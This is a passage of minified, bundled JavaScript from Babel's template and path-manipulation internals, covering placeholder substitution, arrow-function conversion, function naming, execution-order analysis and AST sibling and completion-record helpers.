            - { placeholderPattern: false, placeholderWhitelist: new Set(['${W}'])}
            - { placeholderPattern: /^${W}$/ }`)}}),Object.keys(Q).forEach((Y)=>{if(!X.placeholderNames.has(Y))throw Error(`Unknown substitution "${Y}" given`)});return X.placeholders.slice().reverse().forEach((Y)=>{try{var W;bf1(Y,J,(W=Q&&Q[Y.name])!=null?W:null)}catch(G){throw G.message=`@babel/template placeholder "${Y.name}": ${G.message}`,G}}),J}function bf1(X,Q,J){if(X.isDuplicate){if(Array.isArray(J))J=J.map(($)=>oz($));else if(typeof J==="object")J=oz(J)}let{parent:Y,key:W,index:G}=X.resolve(Q);if(X.type==="string"){if(typeof J==="string")J=_f1(J);if(!J||!Tf1(J))throw Error("Expected string substitution")}else if(X.type==="statement"){if(G===void 0){if(!J)J=Ef1();else if(Array.isArray(J))J=Sf1(J);else if(typeof J==="string")J=az(rY(J));else if(!UL(J))J=az(J)}else if(J&&!Array.isArray(J)){if(typeof J==="string")J=rY(J);if(!UL(J))J=az(J)}}else if(X.type==="param"){if(typeof J==="string")J=rY(J);if(G===void 0)throw Error("Assertion failure.")}else{if(typeof J==="string")J=rY(J);if(Array.isArray(J))throw Error("Cannot replace single expression with an array.")}function H($,z,U){let K=$[z];if($[z]=U,K.type==="Identifier"||K.type==="Placeholder"){if(K.typeAnnotation)U.typeAnnotation=K.typeAnnotation;if(K.optional)U.optional=K.optional;if(K.decorators)U.decorators=K.decorators}}if(G===void 0)KL(Y,W,J),H(Y,W,J);else{let $=Y[W].slice();if(X.type==="statement"||X.type==="param")if(J==null)$.splice(G,1);else if(Array.isArray(J))$.splice(G,1,...J);else H($,G,J);else H($,G,J);KL(Y,W,$),Y[W]=$}}});var qL=m((BL)=>{Object.defineProperty(BL,"__esModule",{value:!0});BL.default=yf1;var xf1=dY(),ff1=nz(),hf1=sz();function yf1(X,Q,J){Q=X.code(Q);let Y;return(W)=>{let G=(0,xf1.normalizeReplacements)(W);if(!Y)Y=(0,ff1.default)(X,Q,J);return X.unwrap((0,hf1.default)(Y,G))}}});var ML=m((ZL)=>{Object.defineProperty(ZL,"__esModule",{value:!0});ZL.default=lf1;var mf1=dY(),uf1=nz(),cf1=sz();function lf1(X,Q,J){let{metadata:Y,names:W}=pf1(X,Q,J);return(G)=>{let H={};return G.forEach(($,z)=>{H[W[z]]=$}),($)=>{let z=(0,mf1.normalizeReplacements)($);if(z)Object.keys(z).forEach((U)=>{if(hasOwnProperty.call(H,U))throw Error("Unexpected replacement overlap.")});return X.unwrap((0,cf1.default)(Y,z?Object.assign(z,H):H))}}}function pf1(X,Q,J){let Y="BABEL_TPL$",W=Q.join("");do Y="$$"+Y;while(W.includes(Y));let{names:G,code:H}=df1(Q,Y);return{metadata:(0,uf1.default)(X,X.code(H),{parser:J.parser,placeholderWhitelist:new Set(G.concat(J.placeholderWhitelist?Array.from(J.placeholderWhitelist):[])),placeholderPattern:J.placeholderPattern,preserveComments:J.preserveComments,syntacticPlaceholders:J.syntacticPlaceholders}),names:G}}function df1(X,Q){let J=[],Y=X[0];for(let W=1;W<X.length;W++){let G=`${Q}${W-1}`;J.push(G),Y+=G+X[W]}return{names:J,code:Y}}});var DL=m((LL)=>{Object.defineProperty(LL,"__esModule",{value:!0});LL.default=RL;var t6=dY(),jL=qL(),FL=ML(),OL=(0,t6.validate)({placeholderPattern:!1});function RL(X,Q){let J=new WeakMap,Y=new WeakMap,W=Q||(0,t6.validate)(null);return Object.assign((G,...H)=>{if(typeof G==="string"){if(H.length>1)throw Error("Unexpected extra params.");return AL((0,jL.default)(X,G,(0,t6.merge)(W,(0,t6.validate)(H[0]))))}else if(Array.isArray(G)){let $=J.get(G);if(!$)$=(0,FL.default)(X,G,W),J.set(G,$);return AL($(H))}else if(typeof G==="object"&&G){if(H.length>0)throw Error("Unexpected extra params.");return RL(X,(0,t6.merge)(W,(0,t6.validate)(G)))}throw Error(`Unexpected template param ${typeof G}`)},{ast:(G,...H)=>{if(typeof G==="string"){if(H.length>1)throw Error("Unexpected extra params.");return(0,jL.default)(X,G,(0,t6.merge)((0,t6.merge)(W,(0,t6.validate)(H[0])),OL))()}else if(Array.isArray(G)){let $=Y.get(G);if(!$)$=(0,FL.default)(X,G,(0,t6.merge)(W,OL)),Y.set(G,$);return $(H)()}throw Error(`Unexpected template param ${typeof G}`)}})}function AL(X){let Q="";try{throw Error()}catch(J){if(J.stack)Q=J.stack.split(`
`).slice(3).join(`
`)}return(J)=>{try{return X(J)}catch(Y){throw Y.stack+=`
    =============
${Q}`,Y}}}});var IL=m((NL)=>{Object.defineProperty(NL,"__esModule",{value:!0});NL.statements=NL.statement=NL.smart=NL.program=NL.expression=NL.default=void 0;var WQ=GL(),GQ=DL(),tz=NL.smart=(0,GQ.default)(WQ.smart),nf1=NL.statement=(0,GQ.default)(WQ.statement),af1=NL.statements=(0,GQ.default)(WQ.statements),of1=NL.expression=(0,GQ.default)(WQ.expression),sf1=NL.program=(0,GQ.default)(WQ.program),zH0=NL.default=Object.assign(tz.bind(void 0),{smart:tz,statement:nf1,statements:af1,expression:of1,program:sf1,ast:tz.ast})});var vL=m((bL)=>{Object.defineProperty(bL,"__esModule",{value:!0});bL.arrowFunctionToExpression=kh1;bL.ensureBlock=Eh1;bL.ensureFunctionName=ph1;bL.splitExportDeclaration=ch1;bL.toComputedKey=Sh1;bL.unwrapFunctionEnvironment=Th1;var Yh1=$0(),Wh1=IL(),QU=AY(),Gh1=S6(),{arrowFunctionExpression:JU,assignmentExpression:H7,binaryExpression:ez,blockStatement:Hh1,callExpression:j5,conditionalExpression:$h1,expressionStatement:SL,identifier:P0,isIdentifier:zh1,jsxIdentifier:Uh1,logicalExpression:Kh1,LOGICAL_OPERATORS:Vh1,memberExpression:T6,metaProperty:Bh1,numericLiteral:qh1,objectExpression:Zh1,restElement:Mh1,returnStatement:jh1,sequenceExpression:Fh1,spreadElement:Oh1,stringLiteral:EL,super:XU,thisExpression:HQ,toExpression:TL,unaryExpression:Ah1,toBindingIdentifierName:Rh1,isFunction:Lh1,isAssignmentPattern:Dh1,isRestElement:Nh1,getFunctionName:wh1,cloneNode:$7,variableDeclaration:Ih1,variableDeclarator:Ch1,exportNamedDeclaration:CL,exportSpecifier:PL,inherits:Ph1}=Yh1;function Sh1(){let X;if(this.isMemberExpression())X=this.node.property;else if(this.isProperty()||this.isMethod())X=this.node.key;else throw ReferenceError("todo");if(!this.node.computed){if(zh1(X))X=EL(X.name)}return X}function Eh1(){let X=this.get("body"),Q=X.node;if(Array.isArray(X))throw Error("Can't convert array path to a block statement");if(!Q)throw Error("Can't convert node without a body");if(X.isBlockStatement())return Q;let J=[],Y="body",W,G;if(X.isStatement())G="body",W=0,J.push(X.node);else if(Y+=".body.0",this.isFunction())W="argument",J.push(jh1(X.node));else W="expression",J.push(SL(X.node));this.node.body=Hh1(J);let H=this.get(Y);return Gh1.setup.call(X,H,G?H.node[G]:H.node,G,W),this.node}bL.arrowFunctionToShadowed=function(){if(!this.isArrowFunctionExpression())return;this.arrowFunctionToExpression()};function Th1(){if(!this.isArrowFunctionExpression()&&!this.isFunctionExpression()&&!this.isFunctionDeclaration())throw this.buildCodeFrameError("Can only unwrap the environment of a function.");_L(this)}function _h1(X,Q){X.node.type=Q}function kh1({allowInsertArrow:X=!0,allowInsertArrowWithRest:Q=X,noNewArrows:J=!((Y)=>(Y=arguments[0])==null?void 0:Y.specCompliant)()}={}){if(!this.isArrowFunctionExpression())throw this.buildCodeFrameError("Cannot convert non-arrow function to a function expression.");let Y=this;if(!J){var W;Y=(W=Y.ensureFunctionName(!1))!=null?W:Y}let{thisBinding:G,fnPath:H}=_L(Y,J,X,Q);if(H.ensureBlock(),_h1(H,"FunctionExpression"),!J){let $=G?null:H.scope.generateUidIdentifier("arrowCheckId");if($)H.parentPath.scope.push({id:$,init:Zh1([])});return H.get("body").unshiftContainer("body",SL(j5(this.hub.addHelper("newArrowCheck"),[HQ(),$?P0($.name):P0(G)]))),H.replaceWith(j5(T6(H.node,P0("bind")),[$?P0($.name):HQ()])),H.get("callee.object")}return H}var bh1=(0,QU.environmentVisitor)({CallExpression(X,{allSuperCalls:Q}){if(!X.get("callee").isSuper())return;Q.push(X)}});function _L(X,Q=!0,J=!0,Y=!0){let W,G=X.findParent((Z)=>{if(Z.isArrowFunctionExpression())return W!=null||(W=Z),!1;return Z.isFunction()||Z.isProgram()||Z.isClassProperty({static:!1})||Z.isClassPrivateProperty({static:!1})}),H=G.isClassMethod({kind:"constructor"});if(G.isClassProperty()||G.isClassPrivateProperty())if(W)G=W;else if(J)X.replaceWith(j5(JU([],TL(X.node)),[])),G=X.get("callee"),X=G.get("body");else throw X.buildCodeFrameError("Unable to transform arrow inside class property");let{thisPaths:$,argumentsPaths:z,newTargetPaths:U,superProps:K,superCalls:B}=uh1(X);if(H&&B.length>0){if(!J)throw B[0].buildCodeFrameError("When using '@babel/plugin-transform-arrow-functions', it's not possible to compile `super()` in an arrow function without compiling classes.\nPlease add '@babel/plugin-transform-classes' to your Babel configuration.");if(!Y)throw B[0].buildCodeFrameError("When using '@babel/plugin-transform-parameters', it's not possible to compile `super()` in an arrow function with default or rest parameters without compiling classes.\nPlease add '@babel/plugin-transform-classes' to your Babel configuration.");let Z=[];G.traverse(bh1,{allSuperCalls:Z});let M=yh1(G);Z.forEach((L)=>{let R=P0(M);R.loc=L.node.callee.loc,L.get("callee").replaceWith(R)})}if(z.length>0){let Z=$Q(G,"arguments",()=>{let M=()=>P0("arguments");if(G.scope.path.isProgram())return $h1(ez("===",Ah1("typeof",M()),EL("undefined")),G.scope.buildUndefinedNode(),M());else return M()});z.forEach((M)=>{let L=P0(Z);L.loc=M.node.loc,M.replaceWith(L)})}if(U.length>0){let Z=$Q(G,"newtarget",()=>Bh1(P0("new"),P0("target")));U.forEach((M)=>{let L=P0(Z);L.loc=M.node.loc,M.replaceWith(L)})}if(K.length>0){if(!J)throw K[0].buildCodeFrameError("When using '@babel/plugin-transform-arrow-functions', it's not possible to compile `super.prop` in an arrow function without compiling classes.\nPlease add '@babel/plugin-transform-classes' to your Babel configuration.");K.reduce((M,L)=>M.concat(xh1(L)),[]).forEach((M)=>{let L=M.node.computed?"":M.get("property").node.name,R=M.parentPath,j=R.isAssignmentExpression({left:M.node}),F=R.isCallExpression({callee:M.node}),A=R.isTaggedTemplateExpression({tag:M.node}),O=gh1(G,j,L),w=[];if(M.node.computed)w.push(M.get("property").node);if(j){let C=R.node.right;w.push(C)}let N=j5(P0(O),w);if(F)R.unshiftContainer("arguments",HQ()),M.replaceWith(T6(N,P0("call"))),$.push(R.get("arguments.0"));else if(j)R.replaceWith(N);else if(A)M.replaceWith(j5(T6(N,P0("bind"),!1),[HQ()])),$.push(M.get("arguments.0"));else M.replaceWith(N)})}let q;if($.length>0||!Q){if(q=hh1(G,H),Q||H&&kL(G)){if($.forEach((Z)=>{let M=Z.isJSX()?Uh1(q):P0(q);M.loc=Z.node.loc,Z.replaceWith(M)}),!Q)q=null}}return{thisBinding:q,fnPath:X}}function vh1(X){return Vh1.includes(X)}function xh1(X){if(X.parentPath.isAssignmentExpression()&&X.parentPath.node.operator!=="="){let J=X.parentPath,Y=J.node.operator.slice(0,-1),W=J.node.right,G=vh1(Y);if(X.node.computed){let H=X.scope.generateDeclaredUidIdentifier("tmp"),$=X.node.object,z=X.node.property;J.get("left").replaceWith(T6($,H7("=",H,z),!0)),J.get("right").replaceWith(Q(G?"=":Y,T6($,P0(H.name),!0),W))}else{let H=X.node.object,$=X.node.property;J.get("left").replaceWith(T6(H,$)),J.get("right").replaceWith(Q(G?"=":Y,T6(H,P0($.name)),W))}if(G)J.replaceWith(Kh1(Y,J.node.left,J.node.right));else J.node.operator="=";return[J.get("left"),J.get("right").get("left")]}else if(X.parentPath.isUpdateExpression()){let J=X.parentPath,Y=X.scope.generateDeclaredUidIdentifier("tmp"),W=X.node.computed?X.scope.generateDeclaredUidIdentifier("prop"):null,G=[H7("=",Y,T6(X.node.object,W?H7("=",W,X.node.property):X.node.property,X.node.computed)),H7("=",T6(X.node.object,W?P0(W.name):X.node.property,X.node.computed),ez(X.parentPath.node.operator[0],P0(Y.name),qh1(1)))];if(!X.parentPath.node.prefix)G.push(P0(Y.name));J.replaceWith(Fh1(G));let H=J.get("expressions.0.right"),$=J.get("expressions.1.left");return[H,$]}return[X];function Q(J,Y,W){if(J==="=")return H7("=",Y,W);else return ez(J,Y,W)}}function kL(X){return X.isClassMethod()&&!!X.parentPath.parentPath.node.superClass}var fh1=(0,QU.environmentVisitor)({CallExpression(X,{supers:Q,thisBinding:J}){if(!X.get("callee").isSuper())return;if(Q.has(X.node))return;Q.add(X.node),X.replaceWithMultiple([X.node,H7("=",P0(J),P0("this"))])}});function hh1(X,Q){return $Q(X,"this",(J)=>{if(!Q||!kL(X))return HQ();X.traverse(fh1,{supers:new WeakSet,thisBinding:J})})}function yh1(X){return $Q(X,"supercall",()=>{let Q=X.scope.generateUidIdentifier("args");return JU([Mh1(Q)],j5(XU(),[Oh1(P0(Q.name))]))})}function gh1(X,Q,J){return $Q(X,`superprop_${Q?"set":"get"}:${J||""}`,()=>{let W=[],G;if(J)G=T6(XU(),P0(J));else{let H=X.scope.generateUidIdentifier("prop");W.unshift(H),G=T6(XU(),P0(H.name),!0)}if(Q){let H=X.scope.generateUidIdentifier("value");W.push(H),G=H7("=",G,P0(H.name))}return JU(W,G)})}function $Q(X,Q,J){let Y="binding:"+Q,W=X.getData(Y);if(!W){let G=X.scope.generateUidIdentifier(Q);W=G.name,X.setData(Y,W),X.scope.push({id:G,init:J(W)})}return W}var mh1=(0,QU.environmentVisitor)({ThisExpression(X,{thisPaths:Q}){Q.push(X)},JSXIdentifier(X,{thisPaths:Q}){if(X.node.name!=="this")return;if(!X.parentPath.isJSXMemberExpression({object:X.node})&&!X.parentPath.isJSXOpeningElement({name:X.node}))return;Q.push(X)},CallExpression(X,{superCalls:Q}){if(X.get("callee").isSuper())Q.push(X)},MemberExpression(X,{superProps:Q}){if(X.get("object").isSuper())Q.push(X)},Identifier(X,{argumentsPaths:Q}){if(!X.isReferencedIdentifier({name:"arguments"}))return;let J=X.scope;do{if(J.hasOwnBinding("arguments")){J.rename("arguments");return}if(J.path.isFunction()&&!J.path.isArrowFunctionExpression())break}while(J=J.parent);Q.push(X)},MetaProperty(X,{newTargetPaths:Q}){if(!X.get("meta").isIdentifier({name:"new"}))return;if(!X.get("property").isIdentifier({name:"target"}))return;Q.push(X)}});function uh1(X){let Q=[],J=[],Y=[],W=[],G=[];return X.traverse(mh1,{thisPaths:Q,argumentsPaths:J,newTargetPaths:Y,superProps:W,superCalls:G}),{thisPaths:Q,argumentsPaths:J,newTargetPaths:Y,superProps:W,superCalls:G}}function ch1(){if(!this.isExportDeclaration()||this.isExportAllDeclaration())throw Error("Only default and named export declarations can be split.");if(this.isExportNamedDeclaration()&&this.get("specifiers").length>0)throw Error("It doesn't make sense to split exported specifiers.");let X=this.get("declaration");if(this.isExportDefaultDeclaration()){let W=X.isFunctionDeclaration()||X.isClassDeclaration(),G=X.isFunctionExpression()||X.isClassExpression(),H=X.isScope()?X.scope.parent:X.scope,$=X.node.id,z=!1;if(!$){if(z=!0,$=H.generateUidIdentifier("default"),W||G)X.node.id=$7($)}else if(G&&H.hasBinding($.name))z=!0,$=H.generateUidIdentifier($.name);let U=W?X.node:Ih1("var",[Ch1($7($),X.node)]),K=CL(null,[PL($7($),P0("default"))]);if(this.insertAfter(K),this.replaceWith(U),z)H.registerDeclaration(this);return this}else if(this.get("specifiers").length>0)throw Error("It doesn't make sense to split exported specifiers.");let Q=X.getOuterBindingIdentifiers(),J=Object.keys(Q).map((W)=>{return PL(P0(W),P0(W))}),Y=CL(null,J);return this.insertAfter(Y),this.replaceWith(X.node),this}var lh1={"ReferencedIdentifier|BindingIdentifier"(X,Q){if(X.node.name!==Q.name)return;Q.needsRename=!0,X.stop()},Scope(X,Q){if(X.scope.hasOwnBinding(Q.name))X.skip()}};function ph1(X){if(this.node.id)return this;let Q=wh1(this.node,this.parent);if(Q==null)return this;let{name:J}=Q;if(!X&&/[\uD800-\uDFFF]/.test(J))return null;if(J.startsWith("get ")||J.startsWith("set "))return null;J=Rh1(J.replace(/[/ ]/g,"_"));let Y=P0(J);Ph1(Y,Q.originalNode);let W={needsRename:!1,name:J},{scope:G}=this,H=G.getOwnBinding(J);if(H){if(H.kind==="param")W.needsRename=!0}else if(G.parent.hasBinding(J)||G.hasGlobal(J))this.traverse(lh1,W);if(!W.needsRename)return this.node.id=Y,G.getProgramParent().references[Y.name]=!0,this;if(G.hasBinding(Y.name)&&!G.hasGlobal(Y.name))return G.rename(Y.name),this.node.id=Y,G.getProgramParent().references[Y.name]=!0,this;if(!Lh1(this.node))return null;let $=G.generateUidIdentifier(Y.name),z=[];for(let K=0,B=dh1(this.node);K<B;K++)z.push(G.generateUidIdentifier("x"));let U=Wh1.default.expression.ast`
    (function (${$}) {
      function ${Y}(${z}) {
        return ${$7($)}.apply(this, arguments);
      }

      ${$7(Y)}.toString = function () {
        return ${$7($)}.toString();
      }

      return ${$7(Y)};
    })(${TL(this.node)})
  `;return this.replaceWith(U)[0].get("arguments.0")}function dh1(X){let Q=X.params.findIndex((J)=>Dh1(J)||Nh1(J));return Q===-1?X.params.length:Q}});var uL=m((mL)=>{Object.defineProperty(mL,"__esModule",{value:!0});mL._guessExecutionStatusRelativeTo=Oy1;mL._resolve=gL;mL.canHaveVariableDeclarationOrExpression=Ky1;mL.canSwapBetweenExpressionAndStatement=Vy1;mL.getSource=My1;mL.isCompletionRecord=By1;mL.isConstantExpression=Dy1;mL.isInStrictMode=Ny1;mL.isNodeType=Uy1;mL.isStatementOrBlock=qy1;mL.isStatic=zy1;mL.matchesPattern=$y1;mL.referencesImport=Zy1;mL.resolve=Ly1;mL.willIMaybeExecuteBefore=jy1;var th1=$0(),{STATEMENT_OR_BLOCK_KEYS:eh1,VISITOR_KEYS:Xy1,isBlockStatement:yL,isExpression:Qy1,isIdentifier:Jy1,isLiteral:Yy1,isStringLiteral:Wy1,isType:Gy1,matchesPattern:Hy1}=th1;function $y1(X,Q){return Hy1(this.node,X,Q)}mL.has=function(Q){var J;let Y=(J=this.node)==null?void 0:J[Q];if(Y&&Array.isArray(Y))return!!Y.length;else return!!Y};function zy1(){return this.scope.isStatic(this.node)}mL.is=mL.has,mL.isnt=function(Q){return!this.has(Q)},mL.equals=function(Q,J){return this.node[Q]===J};function Uy1(X){return Gy1(this.type,X)}function Ky1(){return(this.key==="init"||this.key==="left")&&this.parentPath.isFor()}function Vy1(X){if(this.key!=="body"||!this.parentPath.isArrowFunctionExpression())return!1;if(this.isExpression())return yL(X);else if(this.isBlockStatement())return Qy1(X);return!1}function By1(X){let Q=this,J=!0;do{let{type:Y,container:W}=Q;if(!J&&(Q.isFunction()||Y==="StaticBlock"))return!!X;if(J=!1,Array.isArray(W)&&Q.key!==W.length-1)return!1}while((Q=Q.parentPath)&&!Q.isProgram()&&!Q.isDoExpression());return!0}function qy1(){if(this.parentPath.isLabeledStatement()||yL(this.container))return!1;else return eh1.includes(this.key)}function Zy1(X,Q){if(!this.isReferencedIdentifier()){if(this.isJSXMemberExpression()&&this.node.property.name===Q||(this.isMemberExpression()||this.isOptionalMemberExpression())&&(this.node.computed?Wy1(this.node.property,{value:Q}):this.node.property.name===Q)){let G=this.get("object");return G.isReferencedIdentifier()&&G.referencesImport(X,"*")}return!1}let J=this.scope.getBinding(this.node.name);if(!J||J.kind!=="module")return!1;let Y=J.path,W=Y.parentPath;if(!W.isImportDeclaration())return!1;if(W.node.source.value===X){if(!Q)return!0}else return!1;if(Y.isImportDefaultSpecifier()&&Q==="default")return!0;if(Y.isImportNamespaceSpecifier()&&Q==="*")return!0;if(Y.isImportSpecifier()&&Jy1(Y.node.imported,{name:Q}))return!0;return!1}function My1(){let X=this.node;if(X.end){let Q=this.hub.getCode();if(Q)return Q.slice(X.start,X.end)}return""}function jy1(X){return this._guessExecutionStatusRelativeTo(X)!=="after"}function xL(X){return X.isProgram()?X:(X.parentPath.scope.getFunctionParent()||X.parentPath.scope.getProgramParent()).path}function Fy1(X,Q){switch(X){case"LogicalExpression":return Q==="right";case"ConditionalExpression":case"IfStatement":return Q==="consequent"||Q==="alternate";case"WhileStatement":case"DoWhileStatement":case"ForInStatement":case"ForOfStatement":return Q==="body";case"ForStatement":return Q==="body"||Q==="update";case"SwitchStatement":return Q==="cases";case"TryStatement":return Q==="handler";case"AssignmentPattern":return Q==="right";case"OptionalMemberExpression":return Q==="property";case"OptionalCallExpression":return Q==="arguments";default:return!1}}function fL(X,Q){for(let J=0;J<Q;J++){let Y=X[J];if(Fy1(Y.parent.type,Y.parentKey))return!0}return!1}var hL=Symbol();function Oy1(X){return YU(this,X,new Map)}function YU(X,Q,J){let Y={this:xL(X),target:xL(Q)};if(Y.target.node!==Y.this.node)return Ry1(X,Y.target,J);let W={target:Q.getAncestry(),this:X.getAncestry()};if(W.target.includes(X))return"after";if(W.this.includes(Q))return"before";let G,H={target:0,this:0};while(!G&&H.this<W.this.length){let K=W.this[H.this];if(H.target=W.target.indexOf(K),H.target>=0)G=K;else H.this++}if(!G)throw Error("Internal Babel error - The two compared nodes don't appear to belong to the same program.");if(fL(W.this,H.this-1)||fL(W.target,H.target-1))return"unknown";let $={this:W.this[H.this-1],target:W.target[H.target-1]};if($.target.listKey&&$.this.listKey&&$.target.container===$.this.container)return $.target.key>$.this.key?"before":"after";let z=Xy1[G.type],U={this:z.indexOf($.this.parentKey),target:z.indexOf($.target.parentKey)};return U.target>U.this?"before":"after"}function Ay1(X,Q,J){if(!Q.isFunctionDeclaration()){if(YU(X,Q,J)==="before")return"before";return"unknown"}else if(Q.parentPath.isExportDeclaration())return"unknown";let Y=Q.scope.getBinding(Q.node.id.name);if(!Y.references)return"before";let W=Y.referencePaths,G;for(let H of W){if(!!H.find((U)=>U.node===Q.node))continue;if(H.key!=="callee"||!H.parentPath.isCallExpression())return"unknown";let z=YU(X,H,J);if(G&&G!==z)return"unknown";else G=z}return G}function Ry1(X,Q,J){let Y=J.get(X.node),W;if(!Y)J.set(X.node,Y=new Map);else if(W=Y.get(Q.node)){if(W===hL)return"unknown";return W}Y.set(Q.node,hL);let G=Ay1(X,Q,J);return Y.set(Q.node,G),G}function Ly1(X,Q){return gL.call(this,X,Q)||this}function gL(X,Q){var J;if((J=Q)!=null&&J.includes(this))return;if(Q=Q||[],Q.push(this),this.isVariableDeclarator()){if(this.get("id").isIdentifier())return this.get("init").resolve(X,Q)}else if(this.isReferencedIdentifier()){let Y=this.scope.getBinding(this.node.name);if(!Y)return;if(!Y.constant)return;if(Y.kind==="module")return;if(Y.path!==this){let W=Y.path.resolve(X,Q);if(this.find((G)=>G.node===W.node))return;return W}}else if(this.isTypeCastExpression())return this.get("expression").resolve(X,Q);else if(X&&this.isMemberExpression()){let Y=this.toComputedKey();if(!Yy1(Y))return;let W=Y.value,G=this.get("object").resolve(X,Q);if(G.isObjectExpression()){let H=G.get("properties");for(let $ of H){if(!$.isProperty())continue;let z=$.get("key"),U=$.isnt("computed")&&z.isIdentifier({name:W});if(U=U||z.isLiteral({value:W}),U)return $.get("value").resolve(X,Q)}}else if(G.isArrayExpression()&&!isNaN(+W)){let $=G.get("elements")[W];if($)return $.resolve(X,Q)}}}function Dy1(){if(this.isIdentifier()){let X=this.scope.getBinding(this.node.name);if(!X)return!1;return X.constant}if(this.isLiteral()){if(this.isRegExpLiteral())return!1;if(this.isTemplateLiteral())return this.get("expressions").every((X)=>X.isConstantExpression());return!0}if(this.isUnaryExpression()){if(this.node.operator!=="void")return!1;return this.get("argument").isConstantExpression()}if(this.isBinaryExpression()){let{operator:X}=this.node;return X!=="in"&&X!=="instanceof"&&this.get("left").isConstantExpression()&&this.get("right").isConstantExpression()}if(this.isMemberExpression())return!this.node.computed&&this.get("object").isIdentifier({name:"Symbol"})&&!this.scope.hasBinding("Symbol",{noGlobals:!0});if(this.isCallExpression())return this.node.arguments.length===1&&this.get("callee").matchesPattern("Symbol.for")&&!this.scope.hasBinding("Symbol",{noGlobals:!0})&&this.get("arguments")[0].isStringLiteral();return!1}function Ny1(){return!!(this.isProgram()?this:this.parentPath).find((J)=>{if(J.isProgram({sourceType:"module"}))return!0;if(J.isClass())return!0;if(J.isArrowFunctionExpression()&&!J.get("body").isBlockStatement())return!1;let Y;if(J.isFunction())Y=J.node.body;else if(J.isProgram())Y=J.node;else return!1;for(let W of Y.directives)if(W.value.value==="use strict")return!0})}});var rL=m((iL)=>{Object.defineProperty(iL,"__esModule",{value:!0});iL._getKey=pL;iL._getPattern=dL;iL.get=Jg1;iL.getAllNextSiblings=Xg1;iL.getAllPrevSiblings=Qg1;iL.getAssignmentIdentifiers=Yg1;iL.getBindingIdentifierPaths=Hg1;iL.getBindingIdentifiers=Wg1;iL.getCompletionRecords=oy1;iL.getNextSibling=ey1;iL.getOpposite=ry1;iL.getOuterBindingIdentifierPaths=$g1;iL.getOuterBindingIdentifiers=Gg1;iL.getPrevSibling=ty1;iL.getSibling=sy1;var GU=E8(),my1=$0(),{getAssignmentIdentifiers:uy1,getBindingIdentifiers:lL,getOuterBindingIdentifiers:cy1,numericLiteral:ly1,unaryExpression:py1}=my1,HU=0,zQ=1;function dy1(X){return{type:HU,path:X}}function iy1(X){return{type:zQ,path:X}}function ry1(){if(this.key==="left")return this.getSibling("right");else if(this.key==="right")return this.getSibling("left");return null}function F5(X,Q,J){if(X)Q.push(...O5(X,J));return Q}function ny1(X,Q,J){let Y=[];for(let W=0;W<X.length;W++){let G=X[W],H=O5(G,J),$=[],z=[];for(let U of H){if(U.type===HU)$.push(U);if(U.type===zQ)z.push(U)}if($.length)Y=$;Q.push(...z)}return Q.push(...Y),Q}function ay1(X){X.forEach((Q)=>{Q.type=zQ})}function WU(X,Q){X.forEach((J)=>{if(J.path.isBreakStatement({label:null}))if(Q)J.path.replaceWith(py1("void",ly1(0)));else J.path.remove()})}function cL(X,Q){let J=[];if(Q.canHaveBreak){let Y=[];for(let W=0;W<X.length;W++){let G=X[W],H=Object.assign({},Q,{inCaseClause:!1});if(G.isBlockStatement()&&(Q.inCaseClause||Q.shouldPopulateBreak))H.shouldPopulateBreak=!0;else H.shouldPopulateBreak=!1;let $=O5(G,H);if($.length>0&&$.every((z)=>z.type===zQ)){if(Y.length>0&&$.every((z)=>z.path.isBreakStatement({label:null}))){if(ay1(Y),J.push(...Y),Y.some((z)=>z.path.isDeclaration())){if(J.push(...$),!Q.shouldPreserveBreak)WU($,!0)}if(!Q.shouldPreserveBreak)WU($,!1)}else if(J.push(...$),!Q.shouldPopulateBreak&&!Q.shouldPreserveBreak)WU($,!0);break}if(W===X.length-1)J.push(...$);else{Y=[];for(let z=0;z<$.length;z++){let U=$[z];if(U.type===zQ)J.push(U);if(U.type===HU)Y.push(U)}}}}else if(X.length)for(let Y=X.length-1;Y>=0;Y--){let W=O5(X[Y],Q);if(W.length>1||W.length===1&&!W[0].path.isVariableDeclaration()&&!W[0].path.isEmptyStatement()){J.push(...W);break}}return J}function O5(X,Q){let J=[];if(X.isIfStatement())J=F5(X.get("consequent"),J,Q),J=F5(X.get("alternate"),J,Q);else if(X.isDoExpression()||X.isFor()||X.isWhile()||X.isLabeledStatement())return F5(X.get("body"),J,Q);else if(X.isProgram()||X.isBlockStatement())return cL(X.get("body"),Q);else if(X.isFunction())return O5(X.get("body"),Q);else if(X.isTryStatement())J=F5(X.get("block"),J,Q),J=F5(X.get("handler"),J,Q);else if(X.isCatchClause())return F5(X.get("body"),J,Q);else if(X.isSwitchStatement())return ny1(X.get("cases"),J,Q);else if(X.isSwitchCase())return cL(X.get("consequent"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0,shouldPreserveBreak:Q.shouldPreserveBreak});else if(X.isBreakStatement())J.push(iy1(X));else J.push(dy1(X));return J}function oy1(X=!1){return O5(this,{canHaveBreak:!1,shouldPopulateBreak:!1,inCaseClause:!1,shouldPreserveBreak:X}).map((J)=>J.path)}function sy1(X){return GU.default.get({parentPath:this.parentPath,parent:this.parent,container:this.container,listKey:this.listKey,key:X}).setContext(this.context)}function ty1(){return this.getSibling(this.key-1)}function ey1(){return this.getSibling(this.key+1)}function Xg1(){let X=this.key,Q=this.getSibling(++X),J=[];while(Q.node)J.push(Q),Q=this.getSibling(++X);return J}function Qg1(){let X=this.key,Q=this.getSibling(--X),J=[];while(Q.node)J.push(Q),Q=this.getSibling(--X);return J}function Jg1(X,Q=!0){if(Q===!0)Q=this.context;let J=X.split(".");if(J.length===1)return pL.call(this,X,Q);else return dL.call(this,J,Q)}function pL(X,Q){let J=this.node,Y=J[X];if(Array.isArray(Y))return Y.map((W,G)=>{return GU.default.get({listKey:X,parentPath:this,parent:J,container:Y,key:G}).setContext(Q)});else return GU.default.get({parentPath:this,parent:J,container:J,key:X}).setContext(Q)}function dL(X,Q){let J=this;for(let Y of X)if(Y===".")J=J.parentPath;else if(Array.isArray(J))J=J[Y];else J=J.get(Y,Q);return J}function Yg1(){return uy1(this.node)}function Wg1(X){return lL(this.node,X)}function Gg1(X){return cy1(this.node,X)}function Hg1(X=!1,Q=!1){let Y=[this],W=Object.create(null);while(Y.length){let G=Y.shift();if(!G)continue;if(!G.node)continue;let H=lL.keys[G.node.type];if(G.isIdentifier()){if(X)(W[G.node.name]=W[G.node.name]||[]).push(G);else W[G.node.name]=G;continue}if(G.isExportDeclaration()){let $=G.get("declaration");if($.isDeclaration())Y.push($);continue}if(Q){if(G.isFunctionDeclaration()){Y.push(G.get("id"));continue}if(G.isFunctionExpression())continue}if(H)for(let $=0;$<H.length;$++){let 